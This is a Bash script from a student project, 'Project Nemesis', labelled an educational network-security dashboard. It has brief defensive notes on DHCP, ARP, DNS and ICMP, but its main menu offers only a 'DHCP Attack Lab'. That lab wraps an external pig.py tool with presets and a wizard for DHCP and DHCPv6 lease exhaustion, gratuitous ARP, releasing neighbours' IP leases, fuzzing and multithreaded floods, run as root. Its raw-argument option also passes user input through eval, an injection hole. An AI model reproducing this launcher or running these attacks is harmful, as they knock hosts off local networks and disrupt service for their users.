#!/usr/bin/env bash
#
# Project Nemesis — a safe, educational network-security dashboard
# I created this project for the software project course at Karaj Azad University.
#
# Run the script with root privileges for the attack module to work.

set -o pipefail

# --- Version & log -----------------------------------------------------------
readonly VERSION='2.2.0'
readonly LOGFILE="${HOME}/.nemesis.log"

# --- Locate script directory (robust path for pig.py) -----------------------
get_script_dir() {
  local source="${BASH_SOURCE[0]}"
  while [ -L "$source" ]; do
    local dir="$(cd -P "$(dirname "$source")" && pwd)"
    source="$(readlink "$source")"
    [[ $source != /* ]] && source="$dir/$source"
  done
  cd -P "$(dirname "$source")" && pwd
}
readonly SCRIPT_DIR="$(get_script_dir)"
readonly PIG_SCRIPT="${SCRIPT_DIR}/DHCP/pig.py"

if [[ ! -f "$PIG_SCRIPT" ]]; then
  printf 'ERROR: %s not found.\n' "$PIG_SCRIPT" >&2
  printf 'Make sure pig.py is inside the DHCP folder next to this script.\n' >&2
  exit 1
fi

# --- Colors (only if stdout is a terminal) -----------------------------------
if [[ -t 1 ]]; then
  readonly RED='\033[1;31m'
  readonly MUTED='\033[0;31m'
  readonly CYAN='\033[1;36m'
  readonly YELLOW='\033[1;33m'
  readonly GREEN='\033[1;32m'
  readonly BOLD='\033[1m'
  readonly RESET='\033[0m'
  readonly HLINE='─'
  readonly VLINE='│'
  readonly TOPL='┌'
  readonly TOPR='┐'
  readonly BOTL='└'
  readonly BOTR='┘'
else
  readonly RED='' MUTED='' CYAN='' YELLOW='' GREEN='' BOLD='' RESET=''
  readonly HLINE='-'
  readonly VLINE='|'
  readonly TOPL='+'
  readonly TOPR='+'
  readonly BOTL='+'
  readonly BOTR='+'
fi

# --- Helper functions --------------------------------------------------------
clear_screen() {
  if command -v tput &>/dev/null; then
    tput clear 2>/dev/null || printf '\033c'
  else
    clear 2>/dev/null || printf '\033c'
  fi
}

banner() {
  local text="$1"
  local width=60
  printf "%b" "$RED"
  printf "%s" "$TOPL"
  for ((i=0; i<width-2; i++)); do printf "%s" "$HLINE"; done
  printf "%s\n" "$TOPR"
  printf "%b" "$VLINE"
  local text_len=${#text}
  local pad_left=$(( (width - 2 - text_len) / 2 ))
  for ((i=0; i<pad_left; i++)); do printf " "; done
  printf "%b" "$BOLD$text$RESET$RED"
  for ((i=0; i<(width - 2 - text_len - pad_left); i++)); do printf " "; done
  printf "%b\n" "$VLINE"
  printf "%s" "$BOTL"
  for ((i=0; i<width-2; i++)); do printf "%s" "$HLINE"; done
  printf "%b\n" "$BOTR"
  printf "%b" "$RESET"
}

logo() {
  clear_screen
  printf '%b' "$RED"
  cat <<'LOGO'
███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
LOGO
  printf '%b\n\n' "${MUTED}               Windows Services Security Pentest Project${RESET}"
  echo
}

pause() {
  printf '\n%b' "${MUTED}Press Enter to return...${RESET}"
  IFS= read -r _ || true
}

log_access() {
  local module="$1"
  printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$module" >> "$LOGFILE"
}

# --- Informational modules (unchanged) ---------------------------------------
show_module() {
  local title="$1" risk="$2" observe="$3" protect="$4"
  clear_screen
  logo
  banner "Module: $title"
  printf '\n%b\n' "${BOLD}${title}${RESET}"
  printf '%b\n\n' "${CYAN}Risk:${RESET} ${risk}"
  printf '%b\n%s\n\n' "${CYAN}What to monitor:${RESET}" "$observe"
  printf '%b\n%s\n' "${CYAN}Defensive focus:${RESET}" "$protect"
  log_access "$title"
}

dhcp_module() {
  show_module \
    'DHCP resilience' \
    'Address allocation can be disrupted or clients can receive untrusted network settings.' \
    'Unexpected DHCP offers, unusually rapid lease consumption, and requests arriving from untrusted switch ports.' \
    'Use DHCP snooping, trust only uplink/server ports, rate-limit requests, and alert on lease-pool exhaustion.'
}

arp_module() {
  show_module \
    'ARP integrity' \
    'Incorrect IP-to-MAC mappings can redirect local network traffic.' \
    'Frequent ARP changes, duplicate IP warnings, and gateway MAC-address changes across endpoints.' \
    'Enable Dynamic ARP Inspection where supported, validate bindings, segment networks, and investigate anomalous changes.'
}

mac_module() {
  show_module \
    'Switch port security' \
    'Excessive or changing source MAC addresses can affect forwarding behavior and reveal unauthorized devices.' \
    'Sudden MAC-table growth, port-security events, and source addresses that change unusually often.' \
    'Set per-port MAC limits, use sticky MAC policies where appropriate, disable unused ports, and retain switch logs.'
}

dns_module() {
  show_module \
    'DNS trust' \
    'Unexpected name-resolution responses can send users and services to the wrong destination.' \
    'Resolver changes, unusual TTL values, lookup failures, and DNS responses from unapproved servers.' \
    'Use approved resolvers, restrict DNS egress, validate DNSSEC when available, and monitor resolver logs.'
}

icmp_module() {
  show_module \
    'ICMP availability' \
    'A surge of diagnostic traffic can consume resources or conceal other network events.' \
    'Sustained ICMP volume, packet loss, elevated latency, and a mismatch between ingress and egress traffic.' \
    'Apply measured rate limits, keep essential diagnostic messages available, and alert on traffic baselines.'
}

show_checklist() {
  clear_screen
  logo
  banner "Defender Readiness Checklist"
  cat <<'CHECKLIST'
[ ] Document trusted DHCP and DNS infrastructure.
[ ] Enable and review switch security logging.
[ ] Separate user, server, and management network segments.
[ ] Establish normal traffic baselines before an incident.
[ ] Test alert escalation and recovery procedures in an authorized lab.
[ ] Keep device firmware and network configurations backed up.
CHECKLIST
  log_access 'Defender readiness checklist'
  pause
}

# --- DHCP attack lab (enhanced) ----------------------------------------------

# Global variable to remember interface across attacks
SAVED_IFACE=""

confirm_attack() {
  local attack_desc="$1"
  printf '\n%b' "${RED}You are about to run:${RESET}"
  printf '\n  %b%s%b\n' "$BOLD" "$attack_desc" "$RESET"
  printf '%b\n' "${RED}This requires root and must ONLY be done on authorised networks.${RESET}"
  printf '%b' "${CYAN}Type 'yes' to confirm: ${RESET}"
  IFS= read -r answer
  case "${answer,,}" in
    y|yes|yep|yeah) return 0 ;;
    *) return 1 ;;
  esac
}

# Run pig with array of arguments
run_pig_with_args() {
  local args=("$@")
  local iface=""
  local cmd=()

  # Check if interface is in the arguments
  for ((i=0; i<${#args[@]}; i++)); do
    if [[ "${args[$i]}" == "-i" ]]; then
      iface="${args[$i+1]}"
      break
    fi
  done

  # If no interface provided, ask (or reuse saved)
  if [[ -z "$iface" ]]; then
    if [[ -n "$SAVED_IFACE" ]]; then
      printf '%b' "${CYAN}Use saved interface ${BOLD}$SAVED_IFACE${RESET}? [Y/n]: "
      IFS= read -r use_saved
      if [[ "${use_saved,,}" == "n" || "${use_saved,,}" == "no" ]]; then
        SAVED_IFACE=""
      fi
    fi
    if [[ -z "$SAVED_IFACE" ]]; then
      printf '%b' "${CYAN}Network interface (e.g. eth0, vboxnet0): ${RESET}"
      IFS= read -r iface
      if [[ -z "$iface" ]]; then
        printf '%b\n' "${RED}No interface given, aborting.${RESET}"
        sleep 1
        return 1
      fi
      SAVED_IFACE="$iface"
    fi
    cmd+=("-i" "$SAVED_IFACE")
  else
    SAVED_IFACE="$iface"
  fi

  local full_cmd=("$PIG_SCRIPT" "${args[@]}" "${cmd[@]}")
  local desc="${full_cmd[*]}"

  clear_screen
  logo
  banner "Execute Attack"
  printf '\n%bCommand:%b\n  %s\n' "$YELLOW" "$RESET" "$desc"
  printf '%b\n' "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

  if ! confirm_attack "$desc"; then
    printf '%b\n' "${MUTED}Attack cancelled.${RESET}"
    pause
    return 0
  fi

  printf '\n%b\n' "${CYAN}Launching attack... (Press Ctrl+C to stop)${RESET}"
  if [[ $EUID -ne 0 ]]; then
    sudo "${full_cmd[@]}"
  else
    "${full_cmd[@]}"
  fi
  printf '\n%b\n' "${GREEN}Attack finished.${RESET}"
  pause
}

# Advanced wizard to build custom pig command
advanced_attack_wizard() {
  local pig_args=()
  local choice=""

  clear_screen
  logo
  banner "Advanced Attack Configuration"
  printf '%b\n' "${MUTED}Configure each option. Leave empty for default.${RESET}\n"

  # Verbosity
  printf '%b' "${CYAN}Verbosity level (0-99, default 10): ${RESET}"
  IFS= read -r verb
  if [[ -n "$verb" ]]; then
    pig_args+=("-v" "$verb")
  fi

  # IPv6 mode
  printf '%b' "${CYAN}Use DHCPv6? [y/N]: ${RESET}"
  IFS= read -r v6
  if [[ "${v6,,}" == "y" ]]; then
    pig_args+=("-6")
    # Rapid commit for v6
    printf '%b' "${CYAN}  Enable RapidCommit? [y/N]: ${RESET}"
    IFS= read -r rapid
    if [[ "${rapid,,}" == "y" ]]; then
      pig_args+=("-1")
    fi
  fi

  # MAC source list
  printf '%b' "${CYAN}Custom MAC list (comma separated, enter to skip): ${RESET}"
  IFS= read -r macs
  if [[ -n "$macs" ]]; then
    pig_args+=("-s" "$macs")
  fi

  # Use identical Ethernet & DHCP MAC?
  printf '%b' "${CYAN}Identical Ethernet & DHCP MAC? [y/N]: ${RESET}"
  IFS= read -r same_mac
  if [[ "${same_mac,,}" == "y" ]]; then
    pig_args+=("-S")
  fi

  # Request options
  printf '%b' "${CYAN}Custom request option codes (e.g. 21,22,23 or 0-80, default: 0-80): ${RESET}"
  IFS= read -r req_opts
  if [[ -n "$req_opts" ]]; then
    pig_args+=("-O" "$req_opts")
  fi

  # Fuzz
  printf '%b' "${CYAN}Enable packet fuzzing? [y/N]: ${RESET}"
  IFS= read -r fuzz
  if [[ "${fuzz,,}" == "y" ]]; then
    pig_args+=("-f")
  fi

  # Threads
  printf '%b' "${CYAN}Number of sending threads (default 1): ${RESET}"
  IFS= read -r threads
  if [[ -n "$threads" ]]; then
    pig_args+=("-t" "$threads")
  fi

  # Monitoring options
  printf '%b' "${CYAN}Show ARP who-has? [y/N]: ${RESET}"
  IFS= read -r arp_mon
  if [[ "${arp_mon,,}" == "y" ]]; then
    pig_args+=("-a")
  fi

  printf '%b' "${CYAN}Show ICMP requests? [y/N]: ${RESET}"
  IFS= read -r icmp_mon
  if [[ "${icmp_mon,,}" == "y" ]]; then
    pig_args+=("-i")
  fi

  printf '%b' "${CYAN}Show lease options? [y/N]: ${RESET}"
  IFS= read -r show_opts
  if [[ "${show_opts,,}" == "y" ]]; then
    pig_args+=("-o")
  fi

  printf '%b' "${CYAN}Show lease confirmations? [y/N]: ${RESET}"
  IFS= read -r show_lease
  if [[ "${show_lease,,}" == "y" ]]; then
    pig_args+=("-l")
  fi

  # Neighbor attacks
  printf '%b' "${CYAN}Neighbor attack: gratuitous ARP? [y/N]: ${RESET}"
  IFS= read -r gar
  if [[ "${gar,,}" == "y" ]]; then
    pig_args+=("-g")
  fi

  printf '%b' "${CYAN}Neighbor attack: release all IPs? [y/N]: ${RESET}"
  IFS= read -r rel
  if [[ "${rel,,}" == "y" ]]; then
    pig_args+=("-r")
  fi

  printf '%b' "${CYAN}ARP neighbor scan? [y/N]: ${RESET}"
  IFS= read -r arpscan
  if [[ "${arpscan,,}" == "y" ]]; then
    pig_args+=("-n")
  fi

  # Timeouts
  printf '%b' "${CYAN}Thread spawn timeout (default 0.4): ${RESET}"
  IFS= read -r t_spawn
  if [[ -n "$t_spawn" ]]; then
    pig_args+=("-x" "$t_spawn")
  fi

  printf '%b' "${CYAN}DOS timeout (default 8): ${RESET}"
  IFS= read -r t_dos
  if [[ -n "$t_dos" ]]; then
    pig_args+=("-y" "$t_dos")
  fi

  printf '%b' "${CYAN}DHCP request timeout (default 2): ${RESET}"
  IFS= read -r t_dhcp
  if [[ -n "$t_dhcp" ]]; then
    pig_args+=("-z" "$t_dhcp")
  fi

  # Color output
  printf '%b' "${CYAN}Colored output? [y/N]: ${RESET}"
  IFS= read -r col
  if [[ "${col,,}" == "y" ]]; then
    pig_args+=("-c")
  fi

  # Show assembled command and allow final edit
  while true; do
    clear_screen
    logo
    banner "Final Command"
    printf '%b\n' "${YELLOW}Current arguments:${RESET}"
    printf '  %s\n' "${pig_args[*]:-(no arguments)}"
    printf '\n%b' "${CYAN}Do you want to edit manually? [e] / Run [r] / Abort [a]: ${RESET}"
    IFS= read -r final
    case "${final,,}" in
      e|edit)
        printf '%b' "${CYAN}Enter additional or replacement arguments: ${RESET}"
        IFS= read -r new_args
        if [[ -n "$new_args" ]]; then
          # Replace pig_args entirely with user's manual args (they can start over)
          pig_args=($new_args)
        fi
        ;;
      r|run)
        run_pig_with_args "${pig_args[@]}"
        return
        ;;
      a|abort)
        printf '%b\n' "${MUTED}Wizard cancelled.${RESET}"
        pause
        return
        ;;
      *)
        printf '%b\n' "${RED}Invalid option.${RESET}"
        sleep 1
        ;;
    esac
  done
}

# Quick presets submenu
quick_attacks_menu() {
  while true; do
    clear_screen
    logo
    banner "Quick Attack Profiles"
    cat <<'QUICKMENU'
  [1] Basic exhaustion (default)
  [2] Verbose exhaustion (verbosity 99)
  [3] Exhaustion + gratuitous ARP
  [4] Exhaustion + release neighbor IPs
  [5] Custom MAC list
  [6] DHCPv6 exhaustion
  [7] Fuzz mode
  [8] Multi-threaded (8 threads) + verbose
  [0] Back
QUICKMENU
    printf '\n%b' "${CYAN}Choice: ${RESET}"
    IFS= read -r choice
    case $choice in
      1) run_pig_with_args ;;
      2) run_pig_with_args -v 99 ;;
      3) run_pig_with_args -g ;;
      4) run_pig_with_args -r ;;
      5)
        printf '%b' "${CYAN}Enter MAC addresses (comma separated): ${RESET}"
        IFS= read -r macs
        [[ -z "$macs" ]] && { printf '%b\n' "${RED}No MACs provided.${RESET}"; sleep 1; continue; }
        run_pig_with_args -s "$macs"
        ;;
      6) run_pig_with_args -6 ;;
      7) run_pig_with_args -f ;;
      8) run_pig_with_args -t 8 -v 99 ;;
      0) break ;;
      *) printf '%b\n' "${RED}Invalid option.${RESET}"; sleep 1 ;;
    esac
  done
}

# Main attack menu
dhcp_attack_menu() {
  while true; do
    clear_screen
    logo
    banner "DHCP Attack Mode"
    cat <<'MAINATTACKMENU'
  [1] Quick Attack (presets)
  [2] Advanced Configuration (wizard)
  [3] Enter raw pig.py arguments
  [0] Return to main menu
MAINATTACKMENU
    printf '\n%b' "${CYAN}Choice: ${RESET}"
    IFS= read -r choice
    case $choice in
      1) quick_attacks_menu ;;
      2) advanced_attack_wizard ;;
      3)
        printf '%b' "${CYAN}Enter raw arguments: ${RESET}"
        IFS= read -r raw_args
        if [[ -z "$raw_args" ]]; then
          printf '%b\n' "${RED}No arguments, aborting.${RESET}"
          sleep 1
          continue
        fi
        # Split raw_args safely for an array
        eval "raw_args_array=($raw_args)"
        run_pig_with_args "${raw_args_array[@]}"
        ;;
      0) break ;;
      *) printf '%b\n' "${RED}Invalid option.${RESET}"; sleep 1 ;;
    esac
  done
}

# --- Help / version (unchanged) ----------------------------------------------
print_help() {
  cat <<HELP
${BOLD}Project Nemesis v${VERSION}${RESET}
A safe, educational network-security dashboard with DHCP attack lab.

Usage:
  $0                     Launch interactive menu
  $0 <module>            Jump directly to a module
  $0 -h, --help          Show this help
  $0 --version           Show version

Modules (name or number):
  1 / dhcp               DHCP resilience (info)
  2 / arp                ARP integrity (info)
  3 / mac                Switch port security (info)
  4 / dns                DNS trust (info)
  5 / icmp               ICMP availability (info)
  6 / checklist          Defender readiness checklist
  7 / attack / dhcplab   DHCP attack lab (practical)
HELP
}

# --- Argument handling -------------------------------------------------------
handle_arg() {
  local arg="${1,,}"
  case "$arg" in
    dhcp)         dhcp_module;;
    arp)          arp_module;;
    mac)          mac_module;;
    dns)          dns_module;;
    icmp)         icmp_module;;
    checklist)    show_checklist;;
    attack|dhcplab|7) dhcp_attack_menu;;
    1)            dhcp_module;;
    2)            arp_module;;
    3)            mac_module;;
    4)            dns_module;;
    5)            icmp_module;;
    6)            show_checklist;;
    -h|--help)    print_help;;
    --version)    printf 'Project Nemesis v%s\n' "$VERSION";;
    *)            printf '%b\n' "${RED}Unknown module: $1${RESET}" >&2
                  print_help
                  exit 1
                  ;;
  esac
}

# --- Main menu ---------------------------------------------------------------
main_menu() {
  while true; do
    clear_screen
    logo
    banner "Security Learning Dashboard"
    printf '%b' "${YELLOW}"
    cat <<'MENU'
  [1] DHCP Attack Lab
  [0] Exit
MENU
    printf '%b' "${RESET}"
    printf '\n%b' "${CYAN}Select a module: ${RESET}"
    IFS= read -r choice || choice=0
    case $choice in
      1) dhcp_attack_menu ;;
      0|q|Q|exit) clear_screen; printf '%b\n' "${MUTED}Stay curious. Stay authorized.${RESET}"; break ;;
      *) printf '%b\n' "${RED}Please select a listed option.${RESET}"; sleep 1 ;;
    esac
  done
}

# --- Entry point -------------------------------------------------------------
if [[ $# -gt 0 ]]; then
  handle_arg "$1"
else
  main_menu
fi